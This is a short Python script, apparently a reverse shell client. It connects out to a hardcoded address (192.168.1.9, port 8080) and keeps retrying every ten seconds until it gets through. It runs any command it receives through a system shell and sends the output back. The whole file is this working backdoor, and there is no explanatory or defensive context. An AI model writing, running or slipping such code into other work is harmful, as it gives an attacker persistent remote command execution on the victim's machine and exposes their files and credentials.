import socket
import time
import subprocess

ip = "192.168.1.9"
port = 8080
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Inicializa o socket

def connection(ip, port):
	try:
		s.connect((ip, port))
		s.send(b"\n[!] Connection received.\n")
		return s
	except Exception as e:
		print("Connection error:", e)
		return None

def listen(s):
	try:
		while True:
			data = s.recv(1024)
			if data[:-1].decode() == "/exit":
				s.close()
				break 
			else:
				cmd(s, data[:-1].decode())
	except Exception as e:
		print("Error in listen:", e)
		main(s)
          
def cmd(s, data):
	try:
		proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		out, err = proc.communicate()
		s.send(out)
	except Exception as e:
		print("Error in cmd:", e)
		main(s)
      
def main(s):
	try:
		while True:
			s_connected = connection(ip, port)
			if s_connected:
				listen(s_connected)
			else:
				print("Connection was wrong, trying again.")
				time.sleep(10)
	except Exception as e:
		print("Connection error: ", e)

main(s)
